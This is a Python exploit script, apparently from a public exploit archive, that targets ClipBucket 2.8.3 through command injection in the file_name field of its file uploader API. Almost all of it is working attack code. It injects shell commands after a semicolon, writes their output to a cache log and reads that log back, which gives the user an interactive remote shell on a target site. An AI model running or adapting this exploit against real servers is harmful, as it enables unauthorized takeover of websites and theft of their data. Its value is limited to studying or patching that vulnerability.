# Date: 2017-10-04
# Exploit Author: Esecurity.ir 
# Vendor Homepage: https://clipbucket.com/
# Version: 2.8.3
# Exploit Code By : Meisam Monsef - Email : meisamrce@gmail.com - TelgramID : @meisamrce
# Usage Exploit : exploit.py http://target.com/path/
 
 
 
import sys,os
try:
    import requests
except Exception as e:
    print &#039;please install module requests!&#039;
    sys.exit()
img = &#039;temp.jpg&#039;
uploadUrl = "api/file_uploader.php"
h = {&#039;user-agent&#039;:&#039;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36&#039;}
 
def getShell(url):
    try:
        r = requests.get(url+&#039;cache/1.log&#039;,headers=h)
        if r.status_code == 200:
            return r.content
        else:
            print &#039;Sorry site is not vulnerable &#039;
            sys.exit()
    except Exception as e:
        print e
        sys.exit()
 
def exploit(url):
    while (1):
        cmd = raw_input(&#039;$&#039;)
        if cmd == &#039;&#039; or cmd == &#039;exit&#039;:
            break
        file_ = {&#039;Filedata&#039;: (img, open(img, &#039;r&#039;),&#039;image/jpg&#039;)}
        data = {&#039;file_name&#039;:&#039;a.jpg;&#039;+cmd+&#039; > ../cache/1.log;a.jpg&#039;}
        try:
            r = requests.post(url+uploadUrl, files=file_,data=data,headers=h)
            if r.status_code == 200:
                if &#039;"success":"yes"&#039; in r.content:
                    print getShell(url)
                else:
                    print &#039;Sorry site is not vulnerable &#039;
                    break
            else:
                print &#039;Sorry site is not vulnerable &#039;
                break
        except Exception as e:
            print e
            break
if not os.path.exists(img):
    print &#039;please create tiny image file name is &#039; + img
    sys.exit()
 
if len(sys.argv) == 2 :
    exploit(sys.argv[1])
else:
    print "Usage Exploit : exploit.py http://target.com/path/";

